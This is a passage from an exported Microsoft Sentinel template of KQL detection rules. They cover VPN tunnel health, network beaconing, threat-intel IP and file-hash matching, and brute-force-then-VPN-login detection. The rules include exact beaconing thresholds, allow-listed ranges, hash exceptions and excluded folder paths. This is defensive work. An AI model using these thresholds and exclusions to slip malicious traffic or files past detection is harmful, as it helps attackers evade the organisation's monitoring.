min_TimeGenerated, max_TimeGenerated, HostName, ExtendedDescription, Tags",
          "queryFrequency": "PT10M",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9011: [Health] - BV Collector - VPN Tunnels Down {{HostName}}",
            "alertDescriptionFormat": "This alert identifies when a BV collector has both management VPN tunnels down. \n{{ExtendedDescription}} \nCategory: Sentinel Usage \n{{Tags}}\n{{bv_rule_combined_string}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/7fec2071-d379-4a5b-b90b-3b5b0b8780cb')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/7fec2071-d379-4a5b-b90b-3b5b0b8780cb')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TEST RULE - Potential beaconing activity (ASIM Network Session schema)",
          "description": "This rule is designed to detect beaconing activity, a suspicious network behavior often associated with malware, command-and-control (C2) communication, or unauthorized automated data exfiltration. Beaconing typically involves periodic connections from an internal source IP to an external destination IP at regular intervals, which can indicate a compromised system or an insider threat.\n\nThe rule:\n\nMonitors network traffic to external IP addresses by filtering out local/private IP ranges.\nIdentifies patterns of repeated connections from the same source IP to the same destination IP over similar time intervals.\nApplies thresholds based on:\nMinimum time between events (TimeDeltaThreshold).\nTotal number of events (TotalEventsThreshold).\nPercentage of events occurring at regular intervals (PercentBeaconThreshold).\n\nSummary of Changes Made to Enrich the Rule\n- I optimized the rule to enriched context by integrating information from ASimDnsActivityLogs. This cross-reference simplifies to correlate flagged destination IPs (DstIpAddr) with DNS-related information to better understand and validate the nature of the communication.\n\nAdded Fieds:\n- \"DnsResponseIpCountry\" geographic attribution.\n- \"DnsQuery)\" provides URL, helping to differentiate legitimate traffic from malicious activity.\n_ BeaconIpAddr  flagged destination IP involved in beaconing activity.\n\n\nMatching DstIpAddr to a DNS response helps identify benign, expected traffic patterns (e.g., regular connections to cloud services).",
          "severity": "Medium",
          "enabled": true,
          "query": "// Define the main rule query\nlet querystarttime = 2d;\nlet queryendtime = 1d;\nlet TimeDeltaThreshold = 10;\nlet TotalEventsThreshold = 5;\nlet PercentBeaconThreshold = 70;\n// Define trusted/whitelisted IP ranges\n// Identify benign IPs that recur internally and add them to the \"LocalNetworks\" list.\nlet LocalNetworks = dynamic([\"169.2.0.0/16\", \"127.0.0.0/8\"]); \n// READ   READ  READ  READ  READ!!\n// Identify benign domains that recur in \"DnsQuery\" and add them to the \"ExcludedDomains\" list.\n//NOTE: Benign Domains are Commented out for testing purposes ONLY.\n//let ExcludedDomains = dynamic([\"azure.com\", \"tableausoftware.com\", \"windows.com\"]);  (to be uncommented and expanded after testing)\nlet ExcludedDomains = dynamic([\"test[.]com\", \"test[.]org\", \"test[.]net\"]); //This is a sample domain/placeholder to allow rule to run.  This will be removed and replaced with line above after full capture of exluded domains and testing is complete.\nlet flagged_beacons = \n    _Im_NetworkSession(starttime=ago(querystarttime), endtime=ago(queryendtime))\n    | where not(ipv4_is_private(DstIpAddr)) // Exclude private IPs\n    | where not(ipv4_is_in_any_range(DstIpAddr, LocalNetworks)) // Exclude whitelisted ranges\n    | project TimeGenerated, SrcIpAddr, SrcPortNumber, DstIpAddr, DstPortNumber, DstBytes, SrcBytes\n    | sort by SrcIpAddr asc, TimeGenerated asc, DstIpAddr asc, DstPortNumber asc\n    | serialize\n    | extend nextTimeGenerated = next(TimeGenerated, 1), nextSrcIpAddr = next(SrcIpAddr, 1)\n    | extend TimeDeltainSeconds = datetime_diff('second', nextTimeGenerated, TimeGenerated)\n    | where SrcIpAddr == nextSrcIpAddr // Focus on the same source IP\n    | where TimeDeltainSeconds > TimeDeltaThreshold // Threshold for repeated connections\n    | project TimeGenerated, TimeDeltainSeconds, SrcIpAddr, SrcPortNumber, DstIpAddr, DstPortNumber, DstBytes, SrcBytes\n    | summarize count(), sum(DstBytes), sum(SrcBytes), make_list(TimeDeltainSeconds) \n        by TimeDeltainSeconds, bin(TimeGenerated, 1h), SrcIpAddr, DstIpAddr, DstPortNumber\n    | summarize (MostFrequentTimeDeltaCount, MostFrequentTimeDeltainSeconds) = arg_max(count_, TimeDeltainSeconds),\n                TotalEvents = sum(count_), TotalSrcBytes = sum(sum_SrcBytes), TotalDstBytes = sum(sum_DstBytes)\n        by bin(TimeGenerated, 1h), SrcIpAddr, DstIpAddr, DstPortNumber\n    | where TotalEvents > TotalEventsThreshold // Only flag significant event counts\n    | extend BeaconPercent = MostFrequentTimeDeltaCount / toreal(TotalEvents) * 100\n    | where BeaconPercent > PercentBeaconThreshold; // Filter for high-frequency beaconing\n// Cross-reference with ASimDnsActivityLogs\nflagged_beacons\n| extend DstIpAddr = tostring(DstIpAddr) // Explicitly cast DstIpAddr to string\n| join kind=inner (\n    ASimDnsActivityLogs\n    | where TimeGenerated between (ago(querystarttime) .. ago(queryendtime)) // Align with session log time range\n    | mv-expand ParsedDnsResponseName = extract_all(@'(\\d+\\.\\d+\\.\\d+\\.\\d+)', DnsResponseName) // Extract IPs from DNS responses\n    | extend ParsedDnsResponseName = tostring(ParsedDnsResponseName) // Explicitly cast to string\n    | project TimeGenerated, ParsedDnsResponseName, DnsResponseName, DnsResponseIpCountry, DnsQuery\n) on $left.DstIpAddr == $right.ParsedDnsResponseName\n// Exclude benign domains\n| where not(DnsQuery has_any(ExcludedDomains)) \n| project TimeGenerated, SrcIpAddr, BeaconDstIp=DstIpAddr, DstPortNumber, BeaconPercent, TotalEvents, \n          TotalSrcBytes, TotalDstBytes, DnsResponseName, DnsResponseIpCountry, DnsQuery\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071",
            "T1095",
            "T1105",
            "T1008"
          ],
          "subTechniques": [
            "T1071.001",
            "T1071.004"
          ],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/a680cf28-f1a0-41e1-ad4f-0ae0223c6f4d')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/a680cf28-f1a0-41e1-ad4f-0ae0223c6f4d')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI Map IP Entity to VMConnection",
          "description": "This query maps any IP indicators of compromise (IOCs) from threat intelligence (TI), by searching for matches in VMConnection.",
          "severity": "Medium",
          "enabled": false,
          "query": "let dt_lookBack = 1h; // Look back 1 hour for VMConnection events\nlet ioc_lookBack = 14d; // Look back 14 days for threat intelligence indicators\n// Fetch threat intelligence indicators related to IP addresses\nlet IP_Indicators = ThreatIntelligenceIndicator\n  | where isnotempty(NetworkIP) or isnotempty(EmailSourceIpAddress) or isnotempty(NetworkDestinationIP) or isnotempty(NetworkSourceIP)\n  | where TimeGenerated >= ago(ioc_lookBack)\n  | extend TI_ipEntity = iff(isnotempty(NetworkIP), NetworkIP, NetworkDestinationIP)\n  | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(NetworkSourceIP), NetworkSourceIP, TI_ipEntity)\n  | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(EmailSourceIpAddress), EmailSourceIpAddress, TI_ipEntity)\n  | where ipv4_is_private(TI_ipEntity) == false and  TI_ipEntity !startswith \"fe80\" and TI_ipEntity !startswith \"::\" and TI_ipEntity !startswith \"127.\"\n  | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n  | where Active == true and ExpirationDateTime > now();\n// Perform a join between IP indicators and VMConnection events\nIP_Indicators\n  // Use innerunique to keep performance fast and result set low, as we only need one match to indicate potential malicious activity that needs investigation\n  | join kind=innerunique (\n      VMConnection\n      | where TimeGenerated >= ago(dt_lookBack)\n      | extend VMConnection_TimeGenerated = TimeGenerated\n  )\n  on $left.TI_ipEntity == $right.RemoteIp\n  // Filter out VMConnection events that occurred after the expiration of the corresponding indicator\n  | where VMConnection_TimeGenerated < ExpirationDateTime\n  // Group the results by IndicatorId and keep the VMConnection event with the latest timestamp\n  | summarize VMConnection_TimeGenerated = arg_max(VMConnection_TimeGenerated, *) by IndicatorId, RemoteIp\n  // Select the desired output fields\n  | project VMConnection_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore,\n    TI_ipEntity, Computer, Direction, ProcessName, SourceIp, DestinationIp, RemoteIp, Protocol, DestinationPort, NetworkIP, NetworkDestinationIP, NetworkSourceIP, EmailSourceIpAddress, Type\n  | extend timestamp = VMConnection_TimeGenerated, HostName = tostring(split(Computer, '.', 0)[0]), DnsDomain = tostring(strcat_array(array_slice(split(Computer, '.'), 1, -1), '.'))\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "9713e3c0-1410-468d-b79e-383448434b2d",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "AllEntities",
              "groupByEntities": [
                "Host"
              ],
              "groupByAlertDetails": [
                "DisplayName"
              ],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "RemoteIp"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.4.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/5a504748-60fc-4c3d-950f-addb7aaf21d1')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/5a504748-60fc-4c3d-950f-addb7aaf21d1')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI map IP entity to Network Session Events (ASIM Network Session schema)",
          "description": "This rule identifies a match Network Sessions for which the source or destination IP address is a known IoC. This analytic rule uses [ASIM](https://aka.ms/AboutASIM) and supports any built-in or custom source that supports the ASIM NetworkSession schema",
          "severity": "Medium",
          "enabled": false,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet IP_TI = materialize (\n  ThreatIntelligenceIndicator\n  | where TimeGenerated >= ago(ioc_lookBack)\n  | extend TI_ipEntity = coalesce(NetworkIP, NetworkDestinationIP, NetworkSourceIP,EmailSourceIpAddress,\"NO_IP\")\n  | where TI_ipEntity != \"NO_IP\"\n  | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n  | where Active == true and ExpirationDateTime > now()\n);\nIP_TI\n  // using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique \n(\n  _Im_NetworkSession (starttime=ago(dt_lookBack))\n  | where isnotempty(SrcIpAddr)\n  // Filters out denied connections which is standard expected security controls - added by Amayor 9/9/2024\n  | where isnotempty(DvcAction)// added Amayor 9/9/2024\n  | where DvcAction != \"Deny\" // added Amayor 9/9/2024\n  | where EventMessage !contains \"Deny tcp src outside\"// added Amayor 9/9/2024\n  | where EventMessage !contains \"Inbound TCP connection denied\" // added AMayor 9/9/2024\n  | where EventMessage !contains \"duration 0:00:30 bytes 0 SYN Timeout\"//The \"SYN Timeout\" is a standard behavior of the ASA when a TCP connection attempt fails due to the lack of a response from the destination server. added by Amayor 9/11/2024\n  | summarize imNWS_mintime=min(TimeGenerated), imNWS_maxtime=max(TimeGenerated) by SrcIpAddr, DstIpAddr, Dvc, DvcAction, EventMessage, EventProduct, EventVendor  \n  | lookup (IP_TI | project TI_ipEntity, Active) on $left.SrcIpAddr == $right.TI_ipEntity\n  | project-rename SrcMatch = Active\n  | lookup (IP_TI | project TI_ipEntity, Active) on $left.DstIpAddr == $right.TI_ipEntity\n  | project-rename DstMatch = Active\n  | where SrcMatch or DstMatch\n  | extend \n      IoCIP = iff(SrcMatch, SrcIpAddr, DstIpAddr),\n      IoCDirection = iff(SrcMatch, \"Source\", \"Destination\")\n)on $left.TI_ipEntity == $right.IoCIP\n| where imNWS_mintime < ExpirationDateTime\n| project imNWS_mintime, imNWS_maxtime, Description, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, SrcIpAddr, DstIpAddr, IoCDirection, IoCIP, Dvc, DvcAction, EventMessage, EventVendor, EventProduct\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "e2399891-383c-4caf-ae67-68a008b9f89e",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "A network session {{IoCDirection}} address {{IoCIP}} matched an IoC.",
            "alertDescriptionFormat": "The {{IoCDirection}} address {{IoCIP}} of a network session  matched a known indicator of compromise of {{ThreatType}}. Consult the threat intelligence blead for more information on the indicator."
          },
          "customDetails": {
            "EventEndTime": "imNWS_maxtime",
            "IoCIPDirection": "IoCDirection",
            "ActivityGroupNames": "ActivityGroupNames",
            "IoCDescription": "Description",
            "IoCExpirationTime": "ExpirationDateTime",
            "EventStartTime": "imNWS_mintime",
            "IndicatorId": "IndicatorId",
            "IoCConfidenceScore": "ConfidenceScore",
            "ThreatType": "ThreatType"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IoCIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.6"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/1eb2a09a-f150-40d2-9072-60624205720c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/1eb2a09a-f150-40d2-9072-60624205720c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TEST RULE - TI map File Hash to DeviceFileEvents Event",
          "description": "This rule will replace the existing \"TI map File Hash to DeviceFileEvents Event\" rule after successful testing and validation. \n\nIdentifies potential malicious file activity on devices by correlating file hashes observed in device file events with threat intelligence indicators. \n\nThe rule excludes known legitimate file hashes (manually updated) and code was updated to filters events located in common system or benign folder paths for better efficiency and to reduce false positives.",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h; // Look back 1 hour for recent device file events\nlet ioc_lookBack = 14d; // Look back 14 days for threat intelligence indicators\n// List of known legitimate file hashes to exclude from further analysis\nlet HashExceptions = datatable(FileHashValue: string)\n[\n    \"9eb3a04ed889c1bd40d295d90bf7d1ef91b1866be82a4340bc81b3970e0b01a9\",\n    \"80678203bd0203a6594f4e330b22543c0de5059382bb1c9334b7868b8f31b1bc\",\n    \"e9c4f5eed186cb129c527c4b8d67d163ea2f2396e9d8b96e30b5e7c12203ce84\",\n    \"8e7fe1a1f3550c479ffd86a77bc9d10686d47f8727025bb891d8f4f0259354c8\",\n    \"3529e11ac45439899a3421cfd85ca0a5132c6d8015b6fdfe3e3544075223a769\",\n    \"06918cf99ad26cd6cf106881c0d5bdb212dc0bac4549805c9f5906e3d03d152c\",\n    \"8e7fe1a1f3550c479ffd86a77bc9d10686d47f8727025bb891d8f4f0259354c8\",\n    \"e9c4f5eed186cb129c527c4b8d67d163ea2f2396e9d8b96e30b5e7c12203ce84\",\n    \"5e0f05c3c52bf8a1e6a7f0f9c96bbd621cf3155af680dfeb1333bb6e4f799789\",\n    \"5e0f05c3c52bf8a1e6a7f0f9c96bbd621cf3155af680dfeb1333bb6e4f799789\",\n    \"4f2aa94a2e345a32dae689176b86c644bef87081ff9daef8c77417731862031b\",\n    \"5a9d9b919cd6a05aecb690d4edf361be4cacc1bc4a50c28130bc8182888f8e43\",\n    \"c96d60551331a196dac54b745aa642cd078ef89b6f267146b705f2c2cbef052d\"\n];\nlet DeviceFileEvents_ = (union\n        (DeviceFileEvents\n        | where TimeGenerated > ago(dt_lookBack)\n        | where isnotempty(SHA1)\n        | extend FileHashValue = SHA1), \n        (DeviceFileEvents\n        | where TimeGenerated > ago(dt_lookBack)\n        | where isnotempty(SHA256)\n        | extend FileHashValue = SHA256)\n    // Exclude known legitimate file hashes\n    | where FileHashValue !in (HashExceptions)\n    // Filter out file events located in common system \n    | where FolderPath !startswith @\"C:\\Windows\\\" \n    | where FolderPath !startswith @\"C:\\Program Files\\\" \n    | where FolderPath !startswith @\"C:\\Program Files (x86)\\\" \n    | where FolderPath !startswith @\"C:\\Users\\Public\\\" \n    | where FolderPath !contains @\"AppData\\Local\\\" \n    | where FolderPath !contains @\"AppData\\Roaming\\\" \n);\n// Extract distinct file hashes from cleaned device file events\nlet Hashes = DeviceFileEvents_\n    | distinct FileHashValue;\n// Query threat intelligence indicators for matching file hashes\nThreatIntelligenceIndicator\n| where isnotempty(FileHashValue) \n| where TimeGenerated > ago(ioc_lookBack) \n| where FileHashValue in (Hashes) \n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId \n| where Active == true and ExpirationDateTime > now() \n| where Description !contains_cs \"State: inactive;\" and Description !contains_cs \"State: falsepos;\" // Exclude known false positives\n// Join threat intelligence indicators with device file events for context\n| join kind=innerunique (DeviceFileEvents_) on $left.FileHashValue == $right.FileHashValue\n| where TimeGenerated < ExpirationDateTime // Ensure file event occurred before the indicator expired\n| summarize TimeGenerated = arg_max(TimeGenerated, *) by IndicatorId, DeviceId\n| project\n    TimeGenerated, \n    TrafficLightProtocolLevel,\n    Description,\n    ActivityGroupNames,\n    IndicatorId,\n    ThreatType, \n    FileHashValue, \n    FileHashType, \n    ExpirationDateTime, \n    ActionType, \n    DeviceId, \n    DeviceName, \n    FolderPath, \n    RequestAccountDomain, // Domain of the account that accessed the file\n    RequestAccountName, // Username of the account that accessed the file\n    RequestAccountSid, \n    MachineGroup // Group to which the machine belongs\n| extend timestamp = TimeGenerated",
          "queryFrequency": "PT3H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl",
            "InitialAccess",
            "Persistence",
            "Execution",
            "DefenseEvasion",
            "Exfiltration"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "RequestAccountName"
                },
                {
                  "identifier": "Sid",
                  "columnName": "RequestAccountSid"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "RequestAccountDomain"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Value",
                  "columnName": "FileHashValue"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Algorithm",
                  "columnName": "FileHashType"
                },
                {
                  "identifier": "Value",
                  "columnName": "FileHashValue"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "DeviceName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/39d36fef-851d-498d-a280-3ef2eb67465c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/39d36fef-851d-498d-a280-3ef2eb67465c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "IP with multiple failed Microsoft Entra ID logins successfully logs in to Palo Alto VPN",
          "description": "This query creates a list of IP addresses with the number of failed login attempts to Entra ID \nabove a set threshold ( default of 5 ).  It then looks for any successful Palo Alto VPN logins from any of these IPs within the same timeframe.",
          "severity": "Medium",
          "enabled": true,
          "query": "//Set a threshold of failed AAD signins from an IP address within 1 day above which we want to deem those logins suspicious.\nlet signin_threshold = 5; \n//Make a list of IPs with AAD signin failures above our threshold.\nlet aadFunc = (tableName:string){\nlet suspicious_signins = \n    table(tableName)\n    //Looking for logon failure results\n    | where ResultType !in (\"0\", \"50125\", \"50140\")\n    //Exclude localhost addresses to reduce the chance of FPs\n    | where IPAddress !in (\"127.0.0.1\", \"::1\")\n    | summarize count() by IPAddress\n    | where count_ >  signin_threshold\n    | summarize make_set(IPAddress);\n    suspicious_signins\n};\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nlet suspicious_signins = \nunion isfuzzy=true aadSignin, aadNonInt\n| summarize make_set(set_IPAddress);\n//See if any of those IPs have sucessfully logged into PA VPNs during the same timeperiod\nCommonSecurityLog\n    //Select only PA VPN sucessful logons\n    | where DeviceVendor == \"Palo Alto Networks\" and DeviceEventClassID == \"globalprotect\"\n    | where Message has \"GlobalProtect gateway user authentication succeeded\"\n    //Parse out the logon source IP from the Message field to match on\n    | extend SourceIP = extract(\"Login from: ([^,]+)\", 1, Message) \n    | where SourceIP in (suspicious_signins)\n    | extend Reason = \"Multiple failed AAD logins from SourceIP\"\n    //Parse out other useful information from Message field\n    | extend User = extract('User name: ([^,]+)', 1, Message) \n    | extend ClientOS = extract('Client OS version: ([^,\\\"]+)', 1, Message)\n    | extend Location = extract('Source region: ([^,]{2})',1, Message)\n    | project TimeGenerated, Reason, SourceIP, User, ClientOS, Location, Message, DeviceName, ReceiptTime, DeviceVendor, DeviceEventClassID, Computer, FileName\n    | extend timestamp = TimeGenerated\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "CredentialAccess"
          ],
          "techniques": [
            "T1078",
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "ba144bf8-75b8-406f-9420-ed74397f9479",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "User"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "DeviceName"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/451d7de4-460d-42f5-8582-8f4af708e6ad')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/451d7de4-460d-42f5-8582-8f4af708e6ad')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Palo Alto - potential beaconing detected",
          "description": "Identifies beaconing patterns from Palo Alto Network traffic logs based on recurrent timedelta patterns.\nThe query leverages various KQL functions to calculate time deltas and then compares it with total events observed in a day to find percentage of beaconing.\nThis outbound beaconing pattern to untrusted public networks should be investigated for any malware callbacks or data exfiltration attempts.\nReference Blog:\nhttp://www.austintaylor.io/detect/beaconing/intrusion/detection/system/command/control/flare/elastic/stack/2017/06/10/detect-beaconing-with-flare-elasticsearch-and-intrusion-detection-systems/\nhttps://techcommunity.microsoft.com/t5/microsoft-sentinel-blog/detect-network-beaconing-via-intra-request-time-delta-patterns/ba-p/779586",
          "severity": "Low",
          "enabled": true,
          "query": "let starttime = 2d;\nlet endtime = 1d;\nlet TimeDeltaThreshold = 25;\nlet TotalEventsThreshold = 30;\nlet MostFrequentTimeDeltaThreshold = 25;\nlet PercentBeaconThreshold = 80;\nCommonSecurityLog\n| where DeviceVendor == \"Palo Alto Networks\" and Activity == \"TRAFFIC\"\n| where TimeGenerated between (startofday(ago(starttime))..startofday(ago(endtime)))\n| where ipv4_is_private(DestinationIP)== false\n| project TimeGenerated, DeviceName, SourceUserID, SourceIP, SourcePort, DestinationIP, DestinationPort, ReceivedBytes, SentBytes\n| sort by SourceIP asc,TimeGenerated asc, DestinationIP asc, DestinationPort asc\n| serialize\n| extend nextTimeGenerated = next(TimeGenerated, 1), nextSourceIP = next(SourceIP, 1)\n| extend TimeDeltainSeconds = datetime_diff('second',nextTimeGenerated,TimeGenerated)\n| where SourceIP == nextSourceIP\n//Whitelisting criteria/ threshold criteria\n| where TimeDeltainSeconds > TimeDeltaThreshold\n| summarize count(), sum(ReceivedBytes), sum(SentBytes)\nby TimeDeltainSeconds, bin(TimeGenerated, 1h), DeviceName, SourceUserID, SourceIP, DestinationIP, DestinationPort\n| summarize (MostFrequentTimeDeltaCount, MostFrequentTimeDeltainSeconds) = arg_max(count_, TimeDeltainSeconds), TotalEvents=sum(count_), TotalSentBytes = sum(sum_SentBytes), TotalReceivedBytes = sum(sum_ReceivedBytes)\nby bin(TimeGenerated, 1h), DeviceName, SourceUserID, SourceIP, DestinationIP, DestinationPort\n| where TotalEvents > TotalEventsThreshold and MostFrequentTimeDeltaCount > MostFrequentTimeDeltaThreshold\n| extend BeaconPercent = MostFrequentTimeDeltaCount/toreal(TotalEvents) * 100\n| where BeaconPercent > PercentBeaconThreshold\n| extend timestamp = TimeGenerated, IPCustomEntity = DestinationIP, AccountCustomEntity = SourceUserID, HostCustomEntity = DeviceName\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071",
            "T1571"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "f0be259a-34ac-4946-aa15-ca2b115d5feb",
